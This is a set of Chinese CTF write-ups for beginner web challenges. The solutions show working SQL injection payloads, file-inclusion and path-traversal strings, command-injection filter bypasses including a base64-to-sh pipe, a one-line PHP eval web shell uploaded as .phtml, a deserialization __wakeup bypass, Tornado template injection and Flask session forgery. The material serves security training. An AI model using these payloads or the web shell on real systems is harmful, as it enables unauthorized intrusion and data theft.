[TOC]

## [极客大挑战 2019]EasySQL

![image-20221229120018704](https://s2.loli.net/2022/12/29/FMtGnOo75dyPpE4.png)

我们登录的时候使用bp抓包，我们尝试从密码进行sql注入

![image-20221229124310640](https://s2.loli.net/2022/12/29/tNmYygWbLwX9qOI.png)



由于密码是字符串，所以我们尝试使用单引号闭合，然后使用万能密码 `or 1=1 #` 直接成功了

payload:

```mysql
' or 1=1%23			//%23是#unicode编码
```





## [HCTF 2018]WarmUp

<img src="https://s2.loli.net/2022/12/29/S4QbTKIFqxdnO5L.png" alt="image-20221229124822502" style="zoom:25%;" />

进来后看到一个表情，我们查看源代码:

<img src="https://s2.loli.net/2022/12/29/8LpoPrCvNWzH3KR.png" alt="image-20221229124906072" style="zoom:33%;" />



提示我们去 source.php

于是,访问source.php:

<img src="https://s2.loli.net/2022/12/29/XwjFOsV14TYPKWM.png" alt="image-20221229124944279" style="zoom:33%;" />

我们先对 file 传参 hint.php:

![image-20221229125453134](https://s2.loli.net/2022/12/29/hYQl3UzTpjgd2xm.png)

提示 flag 在 : `ffffllllaaaagggg`

然后我们要分析 checkFile() 这个函数：

```php
public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
```

大概意思就是说，file参数的值，问号?之前的值一定是 `$whitelist` 数组中的元素，如果没有问号？函数会帮我们加上，返回问号？之前的值，如果在 `$whitelist` 数组中，则返回true

于是我们可以初步构造： `?file=hint.php?/../../ffffllllaaaagggg` 

![image-20221229130637473](https://s2.loli.net/2022/12/29/Q6ELhYqA2iVy8wa.png)





但是没有任何反应，可能是因为 flag的路径不对，我们可以多往外查看几层，多加几个 `../`

![image-20221229130736728](https://s2.loli.net/2022/12/29/MAU2gCyGxluXIse.png)



尝试了几次后，就得到了flag(此处我们使用相对路径去包含flag)





## [极客大挑战 2019]Havefun

![image-20221229130958927](https://s2.loli.net/2022/12/29/Q9ElKj5OhWTFHep.png)



查看源代码，只需使用get传参使 cat=dog 即可：

<img src="https://s2.loli.net/2022/12/29/FBngCq1KbAwucNf.png" alt="image-20221229131041275" style="zoom:33%;" />





## [ACTF2020 新生赛]Include



![image-20221229131143940](https://s2.loli.net/2022/12/29/pavdqLHotNgJiwQ.png)

进入页面，发现有一个 tips 链接，点一下：

![image-20221229131229925](https://s2.loli.net/2022/12/29/mKXPof6y79wjhgO.png)

发现url中file的参数是 flag.php

结合题目名称，我们知道这是文件包含漏洞

![image-20221229131558624](https://s2.loli.net/2022/12/29/Ux1e2fEic8SznRC.png)

我们直接使用 `php://filter` 伪协议，将flag.php 转为base64编码，然后base64解密即可:

<img src="https://s2.loli.net/2022/12/29/2romCE9UaNzA6vX.png" alt="image-20221229131712322" style="zoom: 25%;" />

payload:

```php
?file=php://filter/read=convert.base64-encode/resource=flag.php
```





## [ACTF2020 新生赛]Exec

<img src="https://s2.loli.net/2022/12/29/n1d8iuchPMzAtFf.png" alt="image-20221229131816419" style="zoom:33%;" />

打开页面，发现可以使用 ping 命令，于是我们知道，这是命令执行

我们先用bp抓包：

<img src="https://s2.loli.net/2022/12/29/6u8DAV39IKNJtcv.png" alt="image-20221229132009045" style="zoom:33%;" />



修改target，linux命令执行，我们可以使用 `;` `|`  进行分隔：

<img src="https://s2.loli.net/2022/12/29/YlGzm193Ljb7HQC.png" alt="image-20221229132201759" style="zoom:33%;" />



发现flag在根目录下，直接cat查看

<img src="https://s2.loli.net/2022/12/29/T9oy83us4JQZKSW.png" alt="image-20221229132236387" style="zoom:33%;" />





## [强网杯 2019]随便注

我们先判断闭合情况，先用bp抓包：

![image-20221229143254310](C:/Users/LIKE/AppData/Roaming/Typora/typora-user-images/image-20221229143254310.png)





<img src="https://s2.loli.net/2022/12/29/x5ur1q2v83EQKSz.png" alt="image-20221229143404537" style="zoom:33%;" />

发现可以使用单引号闭合，接着我们判断字段数：

<img src="https://s2.loli.net/2022/12/29/6zKp1vtrPDNQxfw.png" alt="image-20221229143522323" style="zoom:33%;" />



发现表中只有两列

接着我们想要使用联合查询去判断回显情况：

![image-20221229143638399](https://s2.loli.net/2022/12/29/uZpaVD5HXWejqES.png)



结果发现select等语句被过滤了，我们发现这样就查询不了数据了。。。

然后经过尝试，我们发现可以进行 `堆叠注入`，我们先查数据库：

<img src="https://s2.loli.net/2022/12/29/GfosNk1dLB5lzmx.png" alt="image-20221229143849236" style="zoom:33%;" />

然后，我们查询当前数据库有哪些表：

<img src="https://s2.loli.net/2022/12/29/1hldTufzy9N3SCb.png" alt="image-20221229143946335" style="zoom:33%;" />

然后分别查询两个表的字段，我们先查 `words` 表：

```sql
?inject=0';show columns from words;%23
```

<img src="https://s2.loli.net/2022/12/29/E2u7SH8PcewhA3z.png" alt="image-20221229144152210" style="zoom:33%;" />

然后我们查询  `1919810931114514` 表的列名

<img src="https://s2.loli.net/2022/12/29/CXS21BOujiLqKE5.png" alt="image-20221229144303447" style="zoom:33%;" />

我们发现，如果直接 `0';show columns from 1919810931114514;%23 ` 的话，是查询不到数据的。

> **MySQL反引号**:  **`** 它是为了区分MYSQL的保留字与普通字符而引入的符号。
>
> 有MYSQL保留字作为字段的，必须加上反引号来区分。

我们需要将该表名加上反引号：

```sql
0';show columns from `1919810931114514`;%23
```

查询到该表下有一个 flag 字段。

禁用了 select 怎么查询数据呢？

**方法一：**

我记得mysql中有一个可以查询数据的语句 : `handler`



> mysql除可使用select查询表中的数据，也可使用**handler语句**，这条语句使我们能够**一行一行的浏览一个表中的数据**，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句.

基本语法：

```mysql
# 打开一个表名为 tbl_name 的表的句柄
HANDLER tbl_name OPEN [ [AS] alias]

# 1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览
HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]

# 2、通过索引查看表
# FIRST: 获取第一行（索引最小的一行）
# NEXT: 获取下一行
# PREV: 获取上一行
# LAST: 获取最后一行（索引最大的一行）
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
    [ WHERE where_condition ] [LIMIT ... ]

# 3、不通过索引查看表
# READ FIRST: 获取句柄的第一行
# READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）
# 最后一行执行之后再执行 READ NEXT 会返回一个空的结果
HANDLER tbl_name READ { FIRST | NEXT }
    [ WHERE where_condition ] [LIMIT ... ]

# 关闭已打开的句柄
HANDLER tbl_name CLOSE
```

于是我们可以使用 handler 语句去查看数据：

先打开，然后查看，接着关闭：

![image-20221229145901288](https://s2.loli.net/2022/12/29/jpN75QRUBlJmZCa.png)

payload：

```mysql
1';handler+`1919810931114514`+open;handler+`1919810931114514`+read+first;handler+`1919810931114514`+close;%23
```

成功查询到flag。我觉得 handler 挺重要的。



方法二：

我们可以使用 **mysql 预处理语句**:

```mysql
- 在sql语句中，@  用于定义变量。
- concat()，函数用于字符串拼接。
- char()，将ASCII码转换为对应的字符。
- 定义预处理语句 PREPARE stmt_name FROM preparable_stmt; 
- 执行预处理语句 EXECUTE stmt_name [USING @var_name [, @var_name] ...]; 
- 删除(释放)定义 {DEALLOCATE | DROP} PREPARE stmt_name;
```

首先，我们先使用 @ 定义变量：

```mysql
set @sql=concat(char(115,101,108,101,99,116),"* from `1919810931114514`");
```

然后我们使用 prepare 编译，使用execute执行:

```mysql
PREPARE yuchuli from @sql;
EXECUTE yuchuli;
```

解释:

```mysql
   - 因为select被过滤，用char(115,101,108,101,99,116)生成select，也可以用拼接生成select。
   - 然后用concat()拼接成一句完整的sql语句。           
   - 先定义了一个变量sql，然后将变量sql定义为预处理语句，然后再执行。
```



于是：

![image-20221229151445644](https://s2.loli.net/2022/12/29/UOevT4wmKcLna9I.png)



[MySQL预处理](https://www.cnblogs.com/geaozhang/p/9891338.html)





**方法三：**

可以使用改表明，列名的方法。





## [SUCTF 2019]EasySQL

https://blog.csdn.net/mochu7777777/article/details/108937396







## [GXYCTF2019]Ping Ping Ping

![image-20221229155148065](https://s2.loli.net/2022/12/29/Ya7iSb3HkAyfwg6.png)



使用bp抓包，易知，这是一道命令执行题.

我们使用  `;`  分隔,使用`ls`查看当前目录下的文件：

![image-20221229155216289](https://s2.loli.net/2022/12/29/xdpUut5Aea7TXiS.png)



发现flag.php 在当前目录，于是我们使用 `cat`  查询flag

![image-20221229155337854](https://s2.loli.net/2022/12/29/qOk96TmfiXN1PQx.png)



发现好像被过滤了。

<img src="https://s2.loli.net/2022/12/29/aYGdKUVpSmJwZ1j.png" alt="image-20221229155433499" style="zoom:33%;" />

去掉 * 发现空格也被过滤了

我们使用 ${IFS} 代替空格

<img src="https://s2.loli.net/2022/12/29/LJEjrvzNPGmWide.png" alt="image-20221229155531904" style="zoom:33%;" />

发现 `{}` 被过滤了 ，于是我们使用 `$IFS$9` 代替

<img src="https://s2.loli.net/2022/12/29/IaQthpZzY41vLMo.png" alt="image-20221229155707796" style="zoom:33%;" />

正常了，但是flag被过滤了。

**解法一：**

我们可以尝试`内联执行` : 将一次的执行结果当作另一次执行的输入

payload:

```shell
/?ip=;cat$IFS$9`ls`
```

反引号`括起来的 `ls` 先执行，得到 flag.php 和 index.php

然后，cat后执行，将flag.php和index.php的内容都输出了

<img src="https://s2.loli.net/2022/12/29/mr3wBczhCHV5lPE.png" alt="image-20221229160134317" style="zoom:33%;" />



**解法二：**

我们先通过cat查看index.php的源码：

payload：

```shell
/?ip=;cat$IFS$9index.php
```

index.php:

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

我们可以使用 `字符串拼接绕过` ，payload:

```shell
/?ip=;b=ag.php;a=fl;cat$IFS$9$b$a;
```

变量 a=fl  变量 b=ag.php  然后cat时我们使用 $b$a 将值给取出来，并拼接成flag.php





**方法三:**

这里过滤了bash，但是我们还可以使用 `sh` , payload:

```shell
/?ip=;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh;
// cat flag.php    base64=>    Y2F0IGZsYWcucGhw
```

![image-20221229161315716](https://s2.loli.net/2022/12/29/X4zGQktnHoEYNj5.png)

payload意思就是，我们先将 base64后的值 `Y2F0IGZsYWcucGhw` 作为 `base64 -d` 的输入，这时就被解码成 cat flag.php 了，然后作为 sh 脚本进行命令执行



## [极客大挑战 2019]Secret File

查看源代码，进入到 `/Archive_room.php` 中

![image-20221229161735727](https://s2.loli.net/2022/12/29/9Z7bFMQr1BfPtaD.png)

点击 secret 时使用bp抓包：

<img src="https://s2.loli.net/2022/12/29/bfBXdncum9I1YLr.png" alt="image-20221229161825235" style="zoom:25%;" />

![image-20221229161840985](https://s2.loli.net/2022/12/29/GVnMWd4bULJejhO.png)

发现了 `secr3t.php` ,我们进入这个页面：

![image-20221229161929596](https://s2.loli.net/2022/12/29/OlifJW6gdzpNEmT.png)

得到了一串代码，审计一下，发现没有过滤 `php://filter`

于是可以使用伪协议读取源代码：

payload:

```php
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20221229162207633](https://s2.loli.net/2022/12/29/kxCJFRYMdTlAr5L.png)

base64解码得到flag



## [极客大挑战 2019]LoveSQL

我们登录时使用bp抓包：

![image-20221229164053229](https://s2.loli.net/2022/12/29/QlZeKhOpdfqItB2.png)

修改 密码为万能密码：`' or 1=1%23'`

![image-20221229164137711](https://s2.loli.net/2022/12/29/pmHF2fCuV8sYMLR.png)

我们发现登录成功，并且有回显，接着我们查看表中字段数： `' order by 3%23`

![image-20221229164310866](https://s2.loli.net/2022/12/29/2oihmXOAyb83Kj9.png)

发现共有三列，接着判断回显：

![image-20221229164352359](https://s2.loli.net/2022/12/29/Ewty7alUgxfNW39.png)

第2、3列会回显，然后就使用联合查询查询：数据库、表、列、数据：

查询数据库：

```mysql
'+union+select+1,database(),3%23
```

查询表：

```mysql
'+union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=database()%23
```

![image-20221229164708813](https://s2.loli.net/2022/12/29/V1Q6XIiyhL8tBzv.png)



查询字段：

payload:

```mysql
'+union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_name='l0ve1ysq1'%23
```

![image-20221229164852700](https://s2.loli.net/2022/12/29/xfiAzDyGZOtchVY.png)

查询password字段数据：

```mysql
'+union+select+1,group_concat(password),3+from+l0ve1ysq1%23
```

![image-20221229165023583](https://s2.loli.net/2022/12/29/Lupwj6okeTntV3r.png)

得到flag





## [极客大挑战 2019]Knife

![image-20221229165209196](https://s2.loli.net/2022/12/29/8UHFrzuiySkY1Go.png)

**解法一:**

直接使用蚁剑连接找 flag

**解法二：**

使用命令执行：

<img src="https://s2.loli.net/2022/12/29/kowHRzyY5OUhnxT.png" alt="image-20221229165308743" style="zoom:25%;" />



## [极客大挑战 2019]Http

查看源代码：发现 `/Secret.php`

![image-20221229165533227](https://s2.loli.net/2022/12/29/8lrtZKVgLHbWMd1.png)

访问一下：

<img src="https://s2.loli.net/2022/12/29/ihXBVYSaDudH9ZW.png" alt="image-20221229165611248" style="zoom:33%;" />

我们先使用bp抓包：

他说不来自这个网址，说明可能检查的是 `Referer` 头

我们加一下就行：

<img src="https://s2.loli.net/2022/12/29/r4kXFzM8yIjveQw.png" alt="image-20221229165810598" style="zoom: 25%;" />

然后又说需要使用这个浏览器，可能检查的是 UA，我们也改一下：

<img src="https://s2.loli.net/2022/12/29/ogVJACYR32sUulI.png" alt="image-20221229165916504" style="zoom: 25%;" />

然后又说，需要从本地阅读，可能是检查ip地址，我们尝试 `X-Forwarded-For` ：

<img src="https://s2.loli.net/2022/12/29/2LJTZGqgXRH1eDl.png" alt="image-20221229170035759" style="zoom: 25%;" />





## [极客大挑战 2019]Upload

文件上传题目，我们先上传一张内容为aaa的png图片：

<img src="https://s2.loli.net/2022/12/29/7nFDlwiYmEkvfZh.png" alt="image-20221229170624254" style="zoom: 25%;" />

发现上传不了，我们猜测可能是图片内容检测，于是我们加上GIF文件头：`GIF89a`

<img src="https://s2.loli.net/2022/12/29/4Q9m1wfBRLIdCzx.png" alt="image-20221229170736572" style="zoom:25%;" />

发现上传成功了，上传路径为： `/upload/`

然后我们修改png图片内容为图片马：

![image-20221229171103822](https://s2.loli.net/2022/12/29/5dsDkViCApKEGnf.png)

然后提示说，不能带有 `<?`，但是我们知道 php的另一种格式：

```php
<script language='php'>@eval($_POST[1]);</script>
```

![image-20221229171223286](https://s2.loli.net/2022/12/29/JyBafbtK41oxmCM.png)

上传成功！

但是png图片怎么执行脚本呢？不行的，我们可以尝试其他后缀 php php3 php5 phtml

![image-20221229171556802](https://s2.loli.net/2022/12/29/M94aifwg31dEmDT.png)

发现phtml可以上传，然后我们访问 /upload/a.phtml:

![image-20221229171823825](https://s2.loli.net/2022/12/29/p9gWDVOw1qr2bku.png)

发现可行，于是使用蚁剑连接得到flag

<img src="https://s2.loli.net/2022/12/29/QNtWoTaGmYb93fS.png" alt="image-20221229171806213" style="zoom:33%;" />



## [ACTF2020 新生赛]Upload

上传一个文件然后抓包：

<img src="https://s2.loli.net/2022/12/29/h5n7LbSwR6tTvGP.png" alt="image-20221229183554196" style="zoom:33%;" />

经过尝试，我们可以上传 `phtml` 后缀文件，内容写一句话木马，上传成功。

然后使用命令执行拿到flag：

<img src="https://s2.loli.net/2022/12/29/Apkq1ZtTcnI8fzm.png" alt="image-20221229183811868" style="zoom:33%;" />





## [极客大挑战 2019]BabySQL

登录使用bp抓包，然后我们去判断闭合：

<img src="https://s2.loli.net/2022/12/29/Bz8Y2UFnN7e3SMR.png" alt="image-20221229185129247" style="zoom: 25%;" />

使用单引号报错，说明可以使用单引号闭合。

然后我们去判断字段数：

<img src="https://s2.loli.net/2022/12/29/N8kqJEOy1BsCjmc.png" alt="image-20221229185245198" style="zoom:25%;" />

报错提示 `der 3` 我们不是 `order by 3` 吗？怎么变这样了，我们猜测可能将这些关键字替换为空了，使用双写绕过：

<img src="https://s2.loli.net/2022/12/29/EyYoT7nD9zkpWGg.png" alt="image-20221229185510246" style="zoom:25%;" />

判断出字段有三个，然后我们使用联合查询判断回显，发现很多关键字也被过滤了，需要双写绕过：

<img src="https://s2.loli.net/2022/12/29/xyATbkjO854Jt97.png" alt="image-20221229185632772" style="zoom:33%;" />

判断出第2、3列回显，于是依次查询数据库、表、列、数据：

```mysql
'+ununionion+seleselectct+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+wwherehere+table_schema=database()%23 
```

<img src="https://s2.loli.net/2022/12/29/LzmWxePuX8wZkvV.png" alt="image-20221229185928408" style="zoom: 25%;" />

```mysql
'+ununionion+seleselectct+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+wwherehere+table_name='b4bsql'%23
```

<img src="https://s2.loli.net/2022/12/29/VH2UkyOzcBFnYQE.png" alt="image-20221229185958150" style="zoom:25%;" />

```mysql
'+ununionion+seleselectct+1,group_concat(passwoorrd),3+frfromom+b4bsql%23
```

<img src="https://s2.loli.net/2022/12/29/mk7HU9L5DEZoQAw.png" alt="image-20221229190008313" style="zoom:25%;" />





## [极客大挑战 2019]PHP

![image-20221229190303654](https://s2.loli.net/2022/12/29/boSxmLu7AhtUrFf.png)

根据提示，备份网站，所以我们访问 `/www.zip` 获得 网站源码：

然后审计 class.php:

```php
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
```

发现析构方法中，如果密码=100&用户名=admin就会输出flag

我们在 index.php 中可以传参：

```php
<?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
```

意思就是需要我们传递一个序列化的对象。但是我们知道，**反序列化之前会调用 __wakeup() 方法**，这会导致admin=guest，这样就不能输出flag了。

我们如何绕过 __wakeup() 方法呢？

<img src="https://s2.loli.net/2022/12/29/tpcy6Bzr1DPOAme.png" alt="image-20221229192436640" style="zoom:33%;" />

由于当前 php 版本是 5.3.3 。存在 wakeup 漏洞：

> 漏洞影响版本：
>
> PHP5 < 5.6.25
>
> PHP7 < 7.0.10
>
> 漏洞产生原因：
>
> 如果存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行 

于是我们可以构造序列化对象：

```php
<?php
class Name{
    private $username = 'admin';
    private $password = '100';
}
echo serialize(new Name());
```

```php
O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}
```

注意：要将属性值改为大于真实属性个数

![image-20221229193457209](https://s2.loli.net/2022/12/29/7K6QJqIgtGBWnHa.png)

然后我们传参发现，居然没有用！

仔细观察payload发现，属性的长度与真实长度好像对不上，于是去查阅资料得知：

> #### PHP——serialize()序列化类变量public、protected、private的区别
>
> public无标记，变量名不变，长度不变: s:2:"op";i:2;
> **protected**在变量名前添加标记%00`*`%00，长度+3: s:5:"%00*%00op";i:2;
> **private**在变量名前添加%00(classname)%00，长度+2+类名长度: s:17:"%00FileHandler_Z%00op";i:2;

所以我们需要在 变量名的  `类名前后都添加 \00` ，这样长度就对上了：

```php
O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}
```

得到flag

![image-20221229194450227](https://s2.loli.net/2022/12/29/P2ZYg7RmJxwf16N.png)



## [ACTF2020 新生赛]BackupFile

我们经过尝试，发现备份文件 /index.php.bak:

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

代码审计知：我们需要get传参一个数字，并且 == `123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3`

由于php弱比较，所以 当数字与字符串进行判断时，字符串的数值相当于第一次出现字母前的数字，若没有数字，则字符串 == 0

因此，我们传参 key=123 即可



## [RoarCTF 2019]Easy Calc

首先查看页面源代码，发现存在 /calc.php

访问它，得到源码:

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?> 
```

然后我们代码审计，发现使用了 eval() 函数，我们可以进行代码执行漏洞。

但是经过尝试，我们发现如果参数num中存在字母的话，就会禁止访问：

<img src="https://s2.loli.net/2022/12/29/PYxmk8RnN5aqzKX.png" alt="image-20221229211115207" style="zoom:25%;" />

我之前一直以为，waf只在php代码中体现，但是这里的话，**waf我们是看不到的**

我们假设waf不允许 num 参数中存在字母，我们可以在**num前加一个空格** ：` num`

这样的话，利用 **php字符串解析特性** ,可能waf会将 变量名中的空白符给去除、或者变成下滑线_

![image-20221229211720616](https://s2.loli.net/2022/12/29/Qo5mvP6BcuklrXw.png)

num前添加空格之后就可以输入字母了，此时我们使用scandir() 扫描根目录下的文件，但是引号''和斜杠/被过滤了。怎么办？此时我们可以考虑使用 chr() 函数，将 / 的ascii码47 转换为 / ，扫描到了flag的位置。

然后我们使用 **file_get_contents()** 函数读取文件内容：

```php
? num=1;print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

使用 chr() 函数去拼接 `/f1agg`



[php字符串解析特性](https://blog.csdn.net/qq_45521281/article/details/105871192)

> 我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
>
> /news.php?%20news[id%00=42"+AND+1=0–
>
> 上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。
>
> HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
>
> ```
> 1.删除空白符
> 
> 2.将某些字符转换为下划线（包括空格）
> ```
>
> 



## [极客大挑战 2019]BuyFlag

首先进入 payFlag页面：

<img src="https://s2.loli.net/2022/12/29/haimzSIXsY8oDGg.png" alt="image-20221229213727267" style="zoom: 25%;" />



发现了几个限制条件：

> You must be a student from CUIT!!!
> You must be answer the correct password!!! 	 
>
> Flag need your 100000000 money							

查看源代码发现：

<img src="https://s2.loli.net/2022/12/29/pF29mZQcSkLV5qG.png" alt="image-20221229213835698" style="zoom: 33%;" />

我们可以post提交一个password，弱类型比较，我们传参：`404a`

首先先用bp抓包：

![image-20221229213951310](https://s2.loli.net/2022/12/29/WNGDpTi6bmC2LaJ.png)

发现urse=0，我们修改为1时，发现我们满足了一个条件。

然后我们修改请求方式为post，并传参 404a,接着我们post传参money：`100000000`

<img src="https://s2.loli.net/2022/12/29/SPirloXYs2TDzn1.png" alt="image-20221229214203922" style="zoom:33%;" />

提示说数字长度太长，于是我们使用科学计数法：`1e9`

<img src="https://s2.loli.net/2022/12/29/9mhQr4IgTcBdMUf.png" alt="image-20221229214254650" style="zoom:33%;" />



## [护网杯 2018]easy_tornado

打开网站发现有三个链接：

<img src="https://s2.loli.net/2022/12/29/j5x7c1lVIBU69tN.png" alt="image-20221229214602936" style="zoom:33%;" />

<img src="https://s2.loli.net/2022/12/29/34x1BUigXwRWM9s.png" alt="image-20221229214610279" style="zoom:33%;" />

<img src="https://s2.loli.net/2022/12/29/hs25rWnRKUkNbIH.png" alt="image-20221229214623547" style="zoom:33%;" />

<img src="https://s2.loli.net/2022/12/29/SxqDFgumJrTlhdk.png" alt="image-20221229214629885" style="zoom:33%;" />

不知道如何下手，然后注意到题目：`tornado` 这是一个python框架。

于是我们猜测，这可能是模板注入。

当我们将url后面的值修改时，会报错：

<img src="https://s2.loli.net/2022/12/29/SfgA6xvkRVl827o.png" alt="image-20221229214842346" style="zoom:33%;" />



> 在tornado模板中，存在一些可以访问的快速对象,这里用到的是**handler.settings**，handler  指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，

于是我们在msg参数中传参 `{{handler.settings}}` 得到cookie_secret得值

![image-20221229215852856](https://s2.loli.net/2022/12/29/TRQUxsW3dgoIcXH.png)

然后我们只需要将 `/fllllllllllllag` md5编码，与 cookie_secret连接在一起后再一次编码即可：

![image-20221229220006734](https://s2.loli.net/2022/12/29/yYiaLPt4SMo1Agk.png)





## [BJDCTF2020]Easy MD5

![image-20221229223053411](https://s2.loli.net/2022/12/29/VJ5Mw8YrnOjd1lZ.png)

bp抓包，发现响应头中有hint：

```mysql
select * from 'admin' where password=md5($pass,true)
```

我们传进来的参数被放到md5()函数中了，这时，我们想起了sql注入中的md5绕过。

选一个字符串，md5之后带有 `' or` 等字符的就可以进行绕过。

当然必须**md5()函数的第二个参数为true**：

  **md5(string,raw)**

| 参数   | 描述                                                         |
| ------ | ------------------------------------------------------------ |
| string | 必需。要计算的字符串。                                       |
| raw    | 可选。     默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串 |

```
content: ffifdyop
hex: 276f722736c95d99e921722cf9ed621c
raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
string: 'or'6]!r,b
```

 这里需要注意的是，当raw项为**true**时，返回的这个原始二进制不是普通的二进制（0，1），而是 `'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c` 这种。

`ffifdyop` 这个字符串就可以进行绕过。

![image-20221229223802809](https://s2.loli.net/2022/12/29/Tmcs85LiMu3ep7S.png)

 我们访问 `/levels91.php` 查看源码：

<img src="https://s2.loli.net/2022/12/29/x8Sl4bnRczTYowF.png" alt="image-20221229223829462" style="zoom:33%;" />

php md5() 函数绕过，我们可以传入两个数组，md5()处理不了数组会返回NULL,于是 NULL==NULL 实现绕过。

<img src="https://s2.loli.net/2022/12/29/Fj2L9wBM4WtYZ8Q.png" alt="image-20221229224020132" style="zoom:33%;" />

和上面一样的方法：

<img src="https://s2.loli.net/2022/12/29/GkIBDlsLmQAj46x.png" alt="image-20221229224209698" style="zoom:33%;" />



## [HCTF 2018]admin

我们注册登录账号之后，在change页源代码中发现了提示：

<img src="https://s2.loli.net/2022/12/29/GXjZVfJaQySo6UH.png" alt="image-20221229224947629" style="zoom:33%;" />

下载后打开，发现这是一个flask框架。由于题目说admin才能有用，于是我们在文件中找到了admin账号、密码。

![image-20221229225056550](https://s2.loli.net/2022/12/29/JRhOCK35z6oW2rb.png)

我们对网页进行抓包，发现session：

![image-20221229225335140](https://s2.loli.net/2022/12/29/YgTwESGFrRauJ91.png)

发现有个 `flask session` 加密，但是 session 可以伪造

我们可以使用脚本，但是想要伪造的话，需要一个key，我们在 config.py 中找到了：

![image-20221229230329840](https://s2.loli.net/2022/12/29/2SznspK9wXWeyd1.png)

![image-20221229230532185](https://s2.loli.net/2022/12/29/u7rIC9dqiL8PER6.png)

如图，解密出来了，我们只需要把用户名换成 admin 在编码为 session即可：

![image-20221229230730894](https://s2.loli.net/2022/12/29/AiLWGUtoIRyKY6m.png)

然后首页把session替换一下即可：

<img src="https://s2.loli.net/2022/12/29/cKpwhOiQ2ANoWgZ.png" alt="image-20221229230858737" style="zoom: 25%;" />







## [ZJCTF 2019]NiZhuanSiWei

```php
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```

代码审计一下，此处考点是文件包含漏洞

text 参数可以使用 `php://input 伪协议`，或者使用 `data 伪协议` 

payload:

```php
?text=data://text/plain,welcome+to+the+zjctf
```

file参数提示要包含 useless.php ,于是我们可以先使用 `php://filter 伪协议`读取源码：

```php
file=php://filter/read=convert.base64-encode/resource=useless.php
```

